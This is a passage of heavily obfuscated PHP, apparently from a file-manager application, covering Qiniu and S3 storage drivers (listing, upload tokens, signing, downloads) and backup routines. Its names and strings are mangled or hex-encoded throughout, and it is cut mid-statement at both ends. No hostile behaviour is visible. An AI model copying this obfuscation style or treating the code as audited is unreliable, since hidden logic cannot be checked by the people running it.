count($‘—€üı¼[$ú±ØÕ°ç[1468]]); } if (!empty($‘—€üı¼[$ú±ØÕ°ç[1469]])) { $¯–© += count($‘—€üı¼[$ú±ØÕ°ç[1469]]); } if ($ıÊã‘¿é === $ú±ØÕ°ç[12]) { break; } continue; } if ($Ìıª…×) { if (!empty($‘—€üı¼[$ú±ØÕ°ç[1468]])) { return !0; } } else { if (!empty($‘—€üı¼[$ú±ØÕ°ç[1469]])) { return !0; } } if ($ıÊã‘¿é === $ú±ØÕ°ç[12]) { break; } } if ($Ë‡ä€İ’) { return array($ú±ØÕ°ç[223] => $ßš¤ö¢‰, $ú±ØÕ°ç[224] => $¯–©); } return !1; } public function listAll($«ïß¨Ö) { $Î¾Ì¯¬ =& $_SERVER[çâ¥×ø³]; $¡Ó·ÖØÂ = $this->fileList($«ïß¨Ö, $Î¾Ì¯¬[12], !0); $®ØÓ›Ú„ = array_to_keyvalue($¡Ó·ÖØÂ[$Î¾Ì¯¬[83]], $Î¾Ì¯¬[32]); foreach ($¡Ó·ÖØÂ[$Î¾Ì¯¬[82]] as $·üê‡) { if (is_string($·üê‡)) { $®ØÓ›Ú„[$·üê‡] = array($Î¾Ì¯¬[76] => 0); } } return $this->listAllFiles($«ïß¨Ö, $®ØÓ›Ú„); } private function fileList($®ÊëÂà, $¬Ò®®¢ = '', $…Ğ¸æ¿  = 0) { $Ö«Şäê’ =& $_SERVER[çâ¥×ø³]; $®ÊëÂà = trim($®ÊëÂà, $Ö«Şäê’[8]); $²é¸æ”Ÿ = empty($®ÊëÂà) && $®ÊëÂà !== $Ö«Şäê’[212] ? $Ö«Şäê’[12] : $®ÊëÂà . $Ö«Şäê’[8]; $„æ‹ï°¬ = $Ö«Şäê’[12]; $Ú† šº· = 1000; $ÁŞ€ùâ¾ = $›õñëÏ = array(); while (!0) { check_abort(); list($û®†å„, $³®Ôô¸Õ) = $this->bucketManager->listFiles($this->bucket, $²é¸æ”Ÿ, $„æ‹ï°¬, $Ú† šº·, $¬Ò®®¢); if ($³®Ôô¸Õ) { break; } $„æ‹ï°¬ = array_key_exists($Ö«Şäê’[1434], $û®†å„) ? $„æ‹ï°¬ = $û®†å„[$Ö«Şäê’[1467]] : $Ö«Şäê’[12]; $ª—ï¾‰¢ = isset($û®†å„[$Ö«Şäê’[1468]]) ? $û®†å„[$Ö«Şäê’[1468]] : array(); $ë¢Úûó® = isset($û®†å„[$Ö«Şäê’[1469]]) ? $û®†å„[$Ö«Şäê’[1469]] : array(); foreach ($ª—ï¾‰¢ as $ÙãÎƒÑ—) { if ($ÙãÎƒÑ—[$Ö«Şäê’[94]] == $²é¸æ”Ÿ) { continue; } $ÎìÜâ‘¡ = $ÙãÎƒÑ—[$Ö«Şäê’[94]]; $«Ô‚¼Ôä = $ÙãÎƒÑ—[$Ö«Şäê’[1465]]; $ÙãÎƒÑ—[$Ö«Şäê’[76]] = $«Ô‚¼Ôä; $áåÖàƒÌ = $«Ô‚¼Ôä == 0 && substr($ÎìÜâ‘¡, strlen($ÎìÜâ‘¡) - 1, 1) == $Ö«Şäê’[8] ? !0 : !1; $this->cacheMethodInfoSet($ÎìÜâ‘¡, $áåÖàƒÌ, $ÙãÎƒÑ—); if ($áåÖàƒÌ) { $ÁŞ€ùâ¾[] = $ÎìÜâ‘¡; continue; } $›õñëÏ[] = $…Ğ¸æ¿  ? $ÙãÎƒÑ— : $ÎìÜâ‘¡; } foreach ($ë¢Úûó® as $ÎìÜâ‘¡) { if ($ÎìÜâ‘¡ == $²é¸æ”Ÿ) { continue; } $ÁŞ€ùâ¾[] = $ÎìÜâ‘¡; $this->cacheMethodInfoSet($ÎìÜâ‘¡, !0); } if ($„æ‹ï°¬ === $Ö«Şäê’[12]) { break; } } $this->cacheMethodInfoSet($®ÊëÂà, !0); return array($Ö«Şäê’[82] => $ÁŞ€ùâ¾, $Ö«Şäê’[83] => $›õñëÏ); } public function canRead($“ÙÑ¬ş˜) { return $this->exist($“ÙÑ¬ş˜) ? !0 : !1; } public function canWrite($àÉ õ») { return $this->exist($àÉ õ») ? !0 : !1; } public function getContent($ıÇúêÓ) { return $this->fileSubstr($ıÇúêÓ, 0, -1); } public function setContent($æÆ¦íäé, $È‡úÍãé = '') { $¡ŸÎƒÁ = $this->tempFile($this->pathThis($æÆ¦íäé)); file_put_contents($¡ŸÎƒÁ, $È‡úÍãé); if ($this->upload($æÆ¦íäé, $¡ŸÎƒÁ)) { $this->tempFileRemve($¡ŸÎƒÁ); return !0; } return !1; } public function refreshUrls($áÕŸ«µ·) { $Éö Ş‚ =& $_SERVER[çâ¥×ø³]; $˜¥ÂÒ®õ = array(); if (is_array($áÕŸ«µ·)) { foreach ($áÕŸ«µ· as $×»•ÆÊÂ) { $˜¥ÂÒ®õ[] = $this->link($×»•ÆÊÂ); } } else { $˜¥ÂÒ®õ[] = $this->link($áÕŸ«µ·); } $ù–»Ùƒ = new Qiniu\Cdn\CdnManager($this->auth); list($ÕìèÙß, $ÛÔÕ±¤ç) = $ù–»Ùƒ->refreshUrls($˜¥ÂÒ®õ); if ($ÛÔÕ±¤ç) { return !1; } return $ÕìèÙß[$Éö Ş‚[1235]] == $Éö Ş‚[808] ? !0 : !1; } public function fileSubstr($üÒà¼™¹, $¤ù”£­, $ª“á¬µÅ) { $‘ª‘ı¦› =& $_SERVER[çâ¥×ø³]; if (!($¯×è¾ü¨ = $this->link($üÒà¼™¹))) { return !1; } $§Ğ×ˆ = !1; if ($ª“á¬µÅ > 0) { $É·Ğ¼ˆ = $¤ù”£­ + $ª“á¬µÅ - 1; $§Ğ×ˆ = array($‘ª‘ı¦›[1470] . $¤ù”£­ . $‘ª‘ı¦›[430] . $É·Ğ¼ˆ); } $Èş‹ªÁÜ = url_request($¯×è¾ü¨, $‘ª‘ı¦›[245], !1, $§Ğ×ˆ); return $Èş‹ªÁÜ[$‘ª‘ı¦›[799]] ? $Èş‹ªÁÜ[$‘ª‘ı¦›[1255]] : !1; } public function upload($íÌ­Í¶æ, $ığĞİ¥¶, $Š­ıê–í = false, $Ò·•Ã„Ø = REPEAT_REPLACE) { $¾ñ››¥Î = new Qiniu\Storage\UploadManager(); $ã¤«íá = $this->auth->uploadToken($this->bucket, $íÌ­Í¶æ); $ÓÄ²­Ğ = get_file_mime(get_path_ext($ığĞİ¥¶)); list($ÃôŞÓÔ§, $ûáª¹˜Ú) = $¾ñ››¥Î->putFile($ã¤«íá, $íÌ­Í¶æ, $ığĞİ¥¶, null, $ÓÄ²­Ğ); return $ûáª¹˜Ú ? !1 : $this->getPathOuter($íÌ­Í¶æ); } public function uploadFormData($ªç™ø…, $ÈŠÇø¼è = 3600) { return $this->uploadToken($ªç™ø…, $ÈŠÇø¼è); } public function multiUploadFormData($ú—é†…—, $ÄŞÙê‚à = 3600) { return $this->uploadToken($ú—é†…—, $ÄŞÙê‚à); } private function uploadToken($Çğ»Ş™á, $ç‘æ­‚¥ = 3600) { $õœ›“Û¸ =& $_SERVER[çâ¥×ø³]; $³í„šÔ = $ç‘æ­‚¥; $Û‘‚Ú‘Ø = array($õœ›“Û¸[1471] => $õœ›“Û¸[1472]); $Ÿå‰ñ‚Æ = $Çğ»Ş™á; $ãğ¼—‘ = $this->auth->uploadToken($this->bucket, $Ÿå‰ñ‚Æ, $³í„šÔ, $Û‘‚Ú‘Ø, !0); $áå± ‰‘ = empty($this->region) || $this->region == $õœ›“Û¸[1473] ? $õœ›“Û¸[12] : $õœ›“Û¸[430] . $this->region; $ş¥ˆ€¯è = http_type() . "\x3a\x2f\57\x75\160\x6c\x6f\141\x64{$áå± ‰‘}\56\x71\x69\156\151\165\160\56\143\157\155\x2f"; return array($õœ›“Û¸[1474] => $ãğ¼—‘, $õœ›“Û¸[1475] => $ş¥ˆ€¯è); } public function download($è§ÅÄÎé, $ûöòƒÔú) { $‰©÷ÊÓË = IO::getPathInner(IO::mkfile($ûöòƒÔú)); if (!($®åÉÆŸÚ = $this->link($è§ÅÄÎé))) { return !1; } $ÏÒòŸç = 0; $©ˆçëµì = 1024 * 200; $ãàºˆ½ = fopen($‰©÷ÊÓË, $_SERVER[çâ¥×ø³][1476]); while (!0) { $İ†Î¡ºÙ = $this->fileSubstr($è§ÅÄÎé, $ÏÒòŸç, $©ˆçëµì); if ($İ†Î¡ºÙ === !1) { return !1; } fwrite($ãàºˆ½, $İ†Î¡ºÙ); $ÏÒòŸç += $©ˆçëµì; if (strlen($İ†Î¡ºÙ) < $©ˆçëµì) { break; } } fclose($ãàºˆ½); return $ûöòƒÔú; } public function link($ÛÉ¢Í², $Å¿Ìíß = '') { if (!$this->isFile($ÛÉ¢Í²)) { return !1; } $İøşá®¢ = $this->getHost() . $_SERVER[çâ¥×ø³][8] . $this->pathEncode($ÛÉ¢Í²) . $Å¿Ìíß; return $this->auth->privateDownloadUrl($İøşá®¢, 3600 * 12); } public function fileOut($²…ÆŠ¥, $¡æ¸’Í = false, $˜â˜Ò’˜ = false, $ÜËØ¶¨“ = '') { $Ä¹ ¯ =& $_SERVER[çâ¥×ø³]; if ($this->isFileOutServer()) { return $this->fileOutServer($²…ÆŠ¥, $¡æ¸’Í, $˜â˜Ò’˜, $ÜËØ¶¨“); } if (!$˜â˜Ò’˜) { $˜â˜Ò’˜ = $this->pathThis($²…ÆŠ¥); } $…»»ÄşÛ = $¡æ¸’Í ? $Ä¹ ¯[1477] . rawurlencode($˜â˜Ò’˜) : $Ä¹ ¯[12]; $Úùªú²¹ = $this->link($²…ÆŠ¥, $…»»ÄşÛ); $this->fileOutLink($Úùªú²¹); } public function fileOutServer($¼Æ§Êİ¦, $êÇŞİ’¸ = false, $ü÷ÎÇˆ® = false, $›Ù÷¾»² = '') { parent::fileOut($¼Æ§Êİ¦, $êÇŞİ’¸, $ü÷ÎÇˆ®, $›Ù÷¾»²); } public function fileOutImage($æŸúÅ¾¤, $ûäó…ù = 250) { $õàµèæä = $this->link($æŸúÅ¾¤, $_SERVER[çâ¥×ø³][1478] . $ûäó…ù); $this->fileOutLink($õàµèæä); } public function fileOutImageServer($Ù…ÕÈÎî, $Œó¿ò·¨ = 250) { parent::fileOutImage($Ù…ÕÈÎî, $Œó¿ò·¨); } public function hashMd5($¨Íš»ö) { $ïÛÕìõÁ =& $_SERVER[çâ¥×ø³]; $£¯¨¶Ş¶ = $this->objectMeta($¨Íš»ö); return isset($£¯¨¶Ş¶[$ïÛÕìõÁ[228]]) ? $£¯¨¶Ş¶[$ïÛÕìõÁ[228]] : !1; $ı¤ü¥Şµ = $this->link($¨Íš»ö, $ïÛÕìõÁ[1479]); } public function size($ÇÀµí’) { $©âÏÒ¸Ù = $this->objectMeta($ÇÀµí’); return $©âÏÒ¸Ù ? $©âÏÒ¸Ù[$_SERVER[çâ¥×ø³][76]] : 0; } public function info($¹œıó…ú) { if ($this->isFolder($¹œıó…ú)) { return $this->folderInfo($¹œıó…ú); } else { if ($this->isFile($¹œıó…ú)) { return $this->fileInfo($¹œıó…ú); } } return !1; } public function exist($½ß÷÷•Û) { return $this->isFile($½ß÷÷•Û) || $this->isFolder($½ß÷÷•Û); } public function isFile($’Ë­®ßş) { return !$this->isFolder($’Ë­®ßş) && $this->objectMeta($’Ë­®ßş); } public function isFolder($Ìõ›¸°¦) { return $this->cacheMethod($_SERVER[çâ¥×ø³][166], $Ìõ›¸°¦); } protected function objectMeta($Ñ—õºÆç) { return $this->cacheMethod($_SERVER[çâ¥×ø³][168], $Ñ—õºÆç); } protected function _objectMeta($Àœ½ìè¿) { $ÂÔ²‡ÍÃ =& $_SERVER[çâ¥×ø³]; list($õ±Ê¢‹ü, $ø·ÕæŒÕ) = $this->bucketManager->stat($this->bucket, $Àœ½ìè¿); if ($õ±Ê¢‹ü) { $õ±Ê¢‹ü[$ÂÔ²‡ÍÃ[76]] = intval($õ±Ê¢‹ü[$ÂÔ²‡ÍÃ[1465]]); } return $õ±Ê¢‹ü; } protected function _isFolder($ú™«ÛÏ™) { $ˆÃØ©¥à =& $_SERVER[çâ¥×ø³]; if ($ú™«ÛÏ™ == $ˆÃØ©¥à[12] || $ú™«ÛÏ™ == $ˆÃØ©¥à[8]) { return !0; } list($Æ‘ˆôÊÏ, $÷¡¨½şö) = $this->bucketManager->listFiles($this->bucket, trim($ú™«ÛÏ™, $ˆÃØ©¥à[8]) . $ˆÃØ©¥à[8], $ˆÃØ©¥à[12], 1, $ˆÃØ©¥à[8]); return !empty($Æ‘ˆôÊÏ[$ˆÃØ©¥à[1468]]) || !empty($Æ‘ˆôÊÏ[$ˆÃØ©¥à[1469]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($êÏï±•³) { parent::__construct($êÏï±•³); } public function uploadFormData($¦ò‰ğë, $ÏÄ™Â = 3600) { $òÌ€ƒ„¨ =& $_SERVER[çâ¥×ø³]; $‡›ÒŒô = $òÌ€ƒ„¨[213]; $ªô„×º = $òÌ€ƒ„¨[253]; $Êëß—õÀ = $òÌ€ƒ„¨[62]; $ÅÇîƒšµ = gmdate($òÌ€ƒ„¨[254]); $ìÏì›Â¥ = gmdate($òÌ€ƒ„¨[255]); $Ãú‘¼àÎ = $òÌ€ƒ„¨[256]; $ëÑ­Ù£– = $ÏÄ™Â . $òÌ€ƒ„¨[12]; $ô×ˆ”¢­ = $òÌ€ƒ„¨[257]; $¤”¢˜äğ = array($this->accessKey, $ìÏì›Â¥, $this->region, $Êëß—õÀ, $Ãú‘¼àÎ); $Ã”•å‹„ = implode($òÌ€ƒ„¨[8], $¤”¢˜äğ); $£Š«–Š† = array($òÌ€ƒ„¨[258] => gmdate($òÌ€ƒ„¨[1377], strtotime($òÌ€ƒ„¨[260])), $òÌ€ƒ„¨[261] => array(array($òÌ€ƒ„¨[262] => $this->bucket), array($òÌ€ƒ„¨[263] => $‡›ÒŒô), array($òÌ€ƒ„¨[264], $òÌ€ƒ„¨[265], $òÌ€ƒ„¨[12]), array($òÌ€ƒ„¨[264], $òÌ€ƒ„¨[266], $òÌ€ƒ„¨[12]), array($òÌ€ƒ„¨[264], $òÌ€ƒ„¨[267], $òÌ€ƒ„¨[12]), array($òÌ€ƒ„¨[268] => $ô×ˆ”¢­), array($òÌ€ƒ„¨[269] => $Ã”•å‹„), array($òÌ€ƒ„¨[270] => $ªô„×º), array($òÌ€ƒ„¨[271] => $ÅÇîƒšµ), array($òÌ€ƒ„¨[272] => $ëÑ­Ù£–))); $ùÆŒÚáŞ = base64_encode(json_encode($£Š«–Š†)); $•±£Øı¿ = hash_hmac($òÌ€ƒ„¨[273], $ìÏì›Â¥, $òÌ€ƒ„¨[274] . $this->secret, !0); $í¦ÓÇ¹’ = hash_hmac($òÌ€ƒ„¨[273], $this->region, $•±£Øı¿, !0); $¡Œ’õƒ = hash_hmac($òÌ€ƒ„¨[273], $Êëß—õÀ, $í¦ÓÇ¹’, !0); $œŸ¢‘å¥ = hash_hmac($òÌ€ƒ„¨[273], $Ãú‘¼àÎ, $¡Œ’õƒ, !0); $Ï³§‘Ô¸ = hash_hmac($òÌ€ƒ„¨[273], $ùÆŒÚáŞ, $œŸ¢‘å¥); $íèƒÃ¨å = array($òÌ€ƒ„¨[230] => $òÌ€ƒ„¨[12], $òÌ€ƒ„¨[275] => $òÌ€ƒ„¨[12], $òÌ€ƒ„¨[263] => $‡›ÒŒô, $òÌ€ƒ„¨[268] => $ô×ˆ”¢­, $òÌ€ƒ„¨[276] => $ùÆŒÚáŞ, $òÌ€ƒ„¨[277] => $Ã”•å‹„, $òÌ€ƒ„¨[278] => $ªô„×º, $òÌ€ƒ„¨[279] => $ÅÇîƒšµ, $òÌ€ƒ„¨[280] => $ëÑ­Ù£–, $òÌ€ƒ„¨[281] => $Ï³§‘Ô¸, $òÌ€ƒ„¨[196] => $this->getHost()); return $íèƒÃ¨å; } public function multiUploadFormData($Ü±»«‡ğ, $»† Ü = 3600) { $‹…Ê®´ =& $_SERVER[çâ¥×ø³]; $ÄÃúÏ½ = gmdate($‹…Ê®´[1480]); $“³÷î›Ô = array(); $Á²úÛÇ = $this->client->getUploadId($this->bucket, $Ü±»«‡ğ, $“³÷î›Ô); if (!$Á²úÛÇ) { return !1; } return array($‹…Ê®´[238] => $Á²úÛÇ, $‹…Ê®´[196] => $this->getHost() . $‹…Ê®´[8] . $this->pathEncode($Ü±»«‡ğ), $‹…Ê®´[239] => $ÄÃúÏ½, $‹…Ê®´[94] => $Ü±»«‡ğ); } public function multiUploadAuthData($ª’Îªœ‹, $ğéÃùÉı = array()) { $ı³µ×Ä® =& $_SERVER[çâ¥×ø³]; $¤şûØÚ = isset($ğéÃùÉı[$ı³µ×Ä®[175]]) ? $ğéÃùÉı[$ı³µ×Ä®[175]] : $ı³µ×Ä®[12]; $ıÎ²Ö“Œ = $ğéÃùÉı[$ı³µ×Ä®[94]]; unset($ğéÃùÉı[$ı³µ×Ä®[94]]); if (isset($ğéÃùÉı[$ı³µ×Ä®[240]])) { return $this->listUploadParts($ıÎ²Ö“Œ, $ğéÃùÉı); } $ë‰õï© = array(); if (isset($ğéÃùÉı[$ı³µ×Ä®[1481]])) { $ë‰õï©[$ı³µ×Ä®[1482]] = $ğéÃùÉı[$ı³µ×Ä®[1481]]; } $÷‡Û „† = explode($ı³µ×Ä®[198], $this->getHost()); $¶ñ§À¥Ô = array($ı³µ×Ä®[1483] => $÷‡Û „†[1], $ı³µ×Ä®[1484] => $ı³µ×Ä®[12], $ı³µ×Ä®[230] => $ı³µ×Ä®[120], $ı³µ×Ä®[275] => $ğéÃùÉı[$ı³µ×Ä®[76]]); $ö¦´ØÒÏ = $ı³µ×Ä®[243]; $¦¸É¸¯¨ = $ı³µ×Ä®[8] . $this->pathEncode($ıÎ²Ö“Œ) . $¤şûØÚ; $¡ÛÛÄËŞ = $this->client->__getSignatureV4($ë‰õï©, $¶ñ§À¥Ô, $ö¦´ØÒÏ, $¦¸É¸¯¨); if (strpos($¤şûØÚ, $ı³µ×Ä®[242]) === 0) { if (isset($ë‰õï©[$ı³µ×Ä®[1482]])) { $œéíù¼Ø = $ë‰õï©[$ı³µ×Ä®[1482]]; } else { if (isset($¡ÛÛÄËŞ[$ı³µ×Ä®[1482]])) { $œéíù¼Ø = $¡ÛÛÄËŞ[$ı³µ×Ä®[1482]]; } else { $œéíù¼Ø = hash($ı³µ×Ä®[273], $ı³µ×Ä®[12]); } } return array($ı³µ×Ä®[249] => $¡ÛÛÄËŞ[$ı³µ×Ä®[249]], $ı³µ×Ä®[1482] => $œéíù¼Ø, $ı³µ×Ä®[239] => $¡ÛÛÄËŞ[$ı³µ×Ä®[1485]]); } return $¡ÛÛÄËŞ[$ı³µ×Ä®[249]]; } public function listUploadParts($ĞŠªƒÔ, $óÇ¸–³à = array()) { $çŠº®„Ö =& $_SERVER[çâ¥×ø³]; $ú¼Ù¨“Å = str_replace($çŠº®„Ö[250], $çŠº®„Ö[12], $óÇ¸–³à[$çŠº®„Ö[175]]); $’¶ã×ÈÌ = $this->client->listParts($this->bucket, $ĞŠªƒÔ, $ú¼Ù¨“Å); if (!$’¶ã×ÈÌ) { return !1; } $‘è’šÛì = $çŠº®„Ö[1486]; foreach ($’¶ã×ÈÌ as $ŒÇŸÚè¡) { $‘è’šÛì .= $çŠº®„Ö[1487] . "\x3c\x50\141\x72\164\x4e\x75\155\x62\145\x72\x3e{$ŒÇŸÚè¡[$çŠº®„Ö[1442]]}\74\57\120\x61\162\164\116\165\155\142\145\x72\x3e\xa" . "\74\x45\x54\x61\x67\76{$ŒÇŸÚè¡[$çŠº®„Ö[1443]]}\x3c\x2f\105\x54\x61\147\76\xa" . $çŠº®„Ö[1488]; } $‘è’šÛì .= $çŠº®„Ö[1489]; $«Õ•çõõ = array(); $™„É÷ø = explode($çŠº®„Ö[198], $this->getHost()); $İ†ç”ÂÔ = array($çŠº®„Ö[1483] => $™„É÷ø[1], $çŠº®„Ö[230] => $çŠº®„Ö[120], $çŠº®„Ö[275] => strlen($‘è’šÛì)); $§­ßŒˆÎ = $çŠº®„Ö[241]; $Ì¥˜¬© = $çŠº®„Ö[8] . $this->pathEncode($ĞŠªƒÔ) . $óÇ¸–³à[$çŠº®„Ö[175]]; $ßŒ¾¤¨¢ = $this->client->__getSignatureV4($«Õ•çõõ, $İ†ç”ÂÔ, $§­ßŒˆÎ, $Ì¥˜¬©, $‘è’šÛì); return array($çŠº®„Ö[249] => $ßŒ¾¤¨¢[$çŠº®„Ö[249]], $çŠº®„Ö[239] => $ßŒ¾¤¨¢[$çŠº®„Ö[1485]], $çŠº®„Ö[251] => $’¶ã×ÈÌ, $çŠº®„Ö[1482] => $ßŒ¾¤¨¢[$çŠº®„Ö[1482]]); } public function link($½è÷Õû, $Ù÷®ÀÀ¬ = array()) { return parent::link($½è÷Õû, $Ù÷®ÀÀ¬); } public function fileOut($¡Œ’¥Ê, $¯óà­èÆ = false, $¸ïşÊ² = false, $º²€Í—å = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[çâ¥×ø³][1490])) { return parent::fileOutServer($¡Œ’¥Ê, $¯óà­èÆ, $¸ïşÊ², $º²€Í—å); } parent::fileOut($¡Œ’¥Ê, $¯óà­èÆ, $¸ïşÊ², $º²€Í—å); } public function fileOutImage($£ŠâñÓ, $æ‹Ãıí® = 250) { if (strstr($this->endpoint, $_SERVER[çâ¥×ø³][1490])) { return parent::fileOutImageServer($£ŠâñÓ, $æ‹Ãıí®); } parent::fileOutImage($£ŠâñÓ, $æ‹Ãıí®); } public function fileOutLink($ÏèÌ’ºˆ) { $¤¿á™Ü =& $_SERVER[çâ¥×ø³]; if (substr($ÏèÌ’ºˆ, 0, 7) == $¤¿á™Ü[1383]) { $ÏèÌ’ºˆ = $¤¿á™Ü[1384] . substr($ÏèÌ’ºˆ, 7); } header($¤¿á™Ü[162] . $ÏèÌ’ºˆ); die; } public function getHost() { $£Ùâæà =& $_SERVER[çâ¥×ø³]; $Œ÷ô¹Öš = str_rtrim(parent::getHost(), $£Ùâæà[8] . $this->bucket); $Œ÷ô¹Öš = explode($£Ùâæà[198], $Œ÷ô¹Öš); return $Œ÷ô¹Öš[0] . $£Ùâæà[198] . $this->bucket . $£Ùâæà[10] . $Œ÷ô¹Öš[1]; } } $_file = $_SERVER[$_SERVER[çâ¥×ø³][927]]; goto E„Õô÷´İ‰; bî¶×õ¶: class BackupDbFile { public function __construct() { } public function index() { $í±ş³˜ =& $_SERVER[çâ¥×ø³]; $äü’ëíí = Backup::get(); $¡ˆøî·Ö = $äü’ëíí[$í±ş³˜[32]]; $×÷¸ÆÀß = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\160\137{$¡ˆøî·Ö}\x2f"; $à¬«„İ = $this->backupPath($äü’ëíí); if (!($à¬«„İ = IO::mkdir($à¬«„İ))) { return !1; } $íØÔñˆù = IO::listPath($×÷¸ÆÀß); $¹–æ = isset($íØÔñˆù[$í±ş³˜[83]]) ? $íØÔñˆù[$í±ş³˜[83]] : array(); $•¿ãĞïî = array_sum(array_column($¹–æ, $í±ş³˜[76])); if (!$•¿ãĞïî) { return !1; } $åŠ¬Âõ = array($í±ş³˜[847] => $•¿ãĞïî, $í±ş³˜[848] => time()); Backup::set($åŠ¬Âõ); $Òì²ğô€ = new TaskFileTransfer($í±ş³˜[849], $í±ş³˜[829], count($¹–æ), LNG($í±ş³˜[830]) . $í±ş³˜[430] . LNG($í±ş³˜[832]) . $í±ş³˜[850]); $Òì²ğô€->task[$í±ş³˜[812]] = $•¿ãĞïî; foreach ($íØÔñˆù[$í±ş³˜[83]] as $óºÚóşñ) { $¹€Æ¤Èì = IO::move($óºÚóşñ[$í±ş³˜[84]], $à¬«„İ); if (!$¹€Æ¤Èì) { $Òì²ğô€->end(); $‹êâ“– = IO::getLastError($í±ş³˜[851] . $óºÚóşñ[$í±ş³˜[84]] . $í±ş³˜[852] . $à¬«„İ . $í±ş³˜[165]); write_log($‹êâ“–, $í±ş³˜[829]); return !1; } } $ç¨µµ™Ë = new DbManage(); $÷²ßû®Í = $ç¨µµ™Ë->getSqlFile(); if (!$÷²ßû®Í[$í±ş³˜[853]] || !$÷²ßû®Í[$í±ş³˜[13]]) { return !1; } IO::move($÷²ßû®Í[$í±ş³˜[853]], $à¬«„İ); IO::move($÷²ßû®Í[$í±ş³˜[13]], $à¬«„İ); $Òì²ğô€->end(); $åŠ¬Âõ = array($í±ş³˜[854] => $•¿ãĞïî, $í±ş³˜[855] => time()); Backup::set($åŠ¬Âõ); return !0; } private function backupPath($óæ™½) { $Â¶¢øÌƒ =& $_SERVER[çâ¥×ø³]; $¸¿ëİß = $óæ™½[$Â¶¢øÌƒ[32]]; $‡åÎ±Õæ = Model($Â¶¢øÌƒ[819])->get($Â¶¢øÌƒ[820]); $‡ÍÌÂºà = substr(md5($Â¶¢øÌƒ[821] . $‡åÎ±Õæ . $¸¿ëİß), 0, 8); return "\x7b\x69\x6f\72{$óæ™½[$Â¶¢øÌƒ[800]]}\x7d\x2f\x64\141\164\141\x62\141\163\145\x2f\x62\141\x63\153\x75\160\57" . $¸¿ëİß . $Â¶¢øÌƒ[11] . $‡ÍÌÂºà; } private function tmpFilesPath() { $¤Çª˜ÁÃ =& $_SERVER[çâ¥×ø³]; $“÷Û´¦ = TEMP_FILES; if ($GLOBALS[$¤Çª˜ÁÃ[6]][$¤Çª˜ÁÃ[89]][$¤Çª˜ÁÃ[845]]) { $“÷Û´¦ = $GLOBALS[$¤Çª˜ÁÃ[6]][$¤Çª˜ÁÃ[89]][$¤Çª˜ÁÃ[845]]; if (!mk_dir($“÷Û´¦) || !is_writable($“÷Û´¦) || !IO::mkfile($“÷Û´¦ . $¤Çª˜ÁÃ[846])) { $“÷Û´¦ = TEMP_FILES; } } return $“÷Û´¦; } } class BackupFile { public function __construct() { } public function index() { $í»úú¨õ = Backup::get(); $×ô¶Üú = $í»úú¨õ[$_SERVER[çâ¥×ø³][337]][$_SERVER[çâ¥×ø³][214]][$_SERVER[çâ¥×ø³][509]]; $–É³¤ÍŠ = array($_SERVER[çâ¥×ø³][510] => array($_SERVER[çâ¥×ø³][856], $×ô¶Üú), $_SERVER[çâ¥×ø³][857] => array($_SERVER[çâ¥×ø³][375], $í»úú¨õ[$_SERVER[çâ¥×ø³][800]])); $õæüµ = (int) Model($_SERVER[çâ¥×ø³][838])->where($–É³¤ÍŠ)->count($_SERVER[çâ¥×ø³][509]); $‡©é¡šİ = (int) Model($_SERVER[çâ¥×ø³][838])->where($–É³¤ÍŠ)->sum($_SERVER[çâ¥×ø³][76]); $Ûµ™’§³ = new TaskFileTransfer($_SERVER[çâ¥×ø³][858], $_SERVER[çâ¥×ø³][829], $õæüµ, LNG($_SERVER[çâ¥×ø³][830]) . $_SERVER[çâ¥×ø³][831] . LNG($_SERVER[çâ¥×ø³][859])); $Ûµ™’§³->task[$_SERVER[çâ¥×ø³][812]] = $‡©é¡šİ; $¶³û–û§ = array($_SERVER[çâ¥×ø³][860] => $õæüµ, $_SERVER[çâ¥×ø³][861] => $‡©é¡šİ, $_SERVER[çâ¥×ø³][862] => time()); Backup::set($¶³û–û§); $§şĞ»ˆ¸ = !0; $÷Î·ÁŞ› = $this->storeIds(); $ÁşÚ‡‡ = 1; $É·—œ = 1000; $üÕùëƒ˜ = $Œ™«ıÈá = 0; $Ìºº­˜Í = array(); $ÙÑ²²“ı = $²¸‡É¿ = 0; do { $¥¡úŒ‡– = $_SERVER[çâ¥×ø³][863]; $«×¤Çü = Model($_SERVER[çâ¥×ø³][838])->where($–É³¤ÍŠ)->field($¥¡úŒ‡–)->order($_SERVER[çâ¥×ø³][864])->selectPage($É·—œ, $ÁşÚ‡‡); $–’¨¶ƒ = !empty($«×¤Çü[$_SERVER[çâ¥×ø³][413]]) ? $«×¤Çü[$_SERVER[çâ¥×ø³][413]] : array(); foreach ($–’¨¶ƒ as $’­›üÂ½) { if (!$this->_fileExist($’­›üÂ½, $Ìºº­˜Í, $÷Î·ÁŞ›)) { $õæüµ -= 1; $‡©é¡šİ -= (int) $’­›üÂ½[$_SERVER[çâ¥×ø³][76]]; write_log("\146\x69\x6c\x65\40\156\157\x74\x20\x65\170\151\163\x74\x2e\146\x69\154\x65\111\104\x3a{$’­›üÂ½[$_SERVER[çâ¥×ø³][509]]}\x2c\x20\x70\141\164\x68\72{$’­›üÂ½[$_SERVER[çâ¥×ø³][84]]}", $_SERVER[çâ¥×ø³][865]); continue; } $êÂûåÚ = $’­›üÂ½[$_SERVER[çâ¥×ø³][84]]; $ÁÛ…šî = "\x7b\151\x6f\x3a{$í»úú¨õ[$_SERVER[çâ¥×ø³][800]]}\175" . substr($êÂûåÚ, strlen("\173\151\157\72{$’­›üÂ½[$_SERVER[çâ¥×ø³][866]]}\x7d")); if (IO::exist($ÁÛ…šî)) { $Ûµ™’§³->updateFileEnd($’­›üÂ½[$_SERVER[çâ¥×ø³][32]], $’­›üÂ½[$_SERVER[çâ¥×ø³][76]]); } else { $ÁÛ…šî = get_path_father($ÁÛ…šî); IO::mkdir($ÁÛ…šî); if (!IO::copy($êÂûåÚ, $ÁÛ…šî, $_SERVER[çâ¥×ø³][867])) { write_log($_SERVER[çâ¥×ø³][868] . $êÂûåÚ . $_SERVER[çâ¥×ø³][852] . $ÁÛ…šî . $_SERVER[çâ¥×ø³][165], $_SERVER[çâ¥×ø³][829]); $§şĞ»ˆ¸ = !1; break; } } $×ô¶Üú = $’­›üÂ½[$_SERVER[çâ¥×ø³][509]]; $Œ™«ıÈá += 1; $üÕùëƒ˜ += $’­›üÂ½[$_SERVER[çâ¥×ø³][76]]; $²¸‡É¿ += 1; $ÙÑ²²“ı += $’­›üÂ½[$_SERVER[çâ¥×ø³][76]]; if ($üÕùëƒ˜ >= 